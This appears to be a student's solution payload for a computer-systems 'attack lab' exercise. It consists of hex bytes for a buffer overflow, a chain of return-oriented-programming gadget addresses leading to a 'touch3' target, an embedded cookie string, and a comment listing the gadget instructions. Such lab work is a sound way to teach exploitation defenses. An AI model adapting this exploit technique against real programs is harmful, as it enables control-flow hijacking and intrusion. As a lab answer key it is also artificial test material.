00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

ab 19 40 00 00 00 00 00
20 00 00 00 00 00 00 00

dd 19 40 00 00 00 00 00

69 1a 40 00 00 00 00 00

13 1a 40 00 00 00 00 00

ad 1a 40 00 00 00 00 00 /* 7 */

c5 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00 /* touch3 */

35 39 62 39 39 37 66 61 00 

/*
pop %rax
.data ?
mov %eax, %edx
mov %edx, %ecx
mov %ecx, %esi
mov %rsp, %rax
mov %rax, %rdi
lea (%rdi, %rsi), %rax
mov %rax, %rdi
touch
*/